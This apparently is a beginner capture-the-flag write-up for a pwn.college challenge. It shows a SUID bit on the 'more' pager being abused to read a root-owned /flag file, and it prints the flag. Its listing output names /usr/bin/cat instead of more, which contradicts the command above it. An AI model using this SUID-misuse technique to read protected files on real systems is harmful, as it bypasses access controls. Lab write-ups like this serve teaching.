# Challenge Name: more
**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---
##🧠 Summary:
The Challenge abuses a SUID bit set on `/usr/bin/more`, allowing an unprivileged user to read the root-owned flag fille att `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/more
```

output:
```
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
```

-The `s` in `-rws` indicates it's a SUID binary.
-`more` runs with **root privileges**.

## 🚀 Exploitation

The `more` command in Linux is a simple terminal-based pager — it lets you view the contents of a file one screen at a time. It’s useful when you're reading large files in the terminal and don’t want everything to scroll past at once.

```bash
more /flag
```
Output:
```
pwn.college{wBB4avmdYHo4WWfhlOF0avwvjUP.dRDNxwSM0IzMyEzW}
```

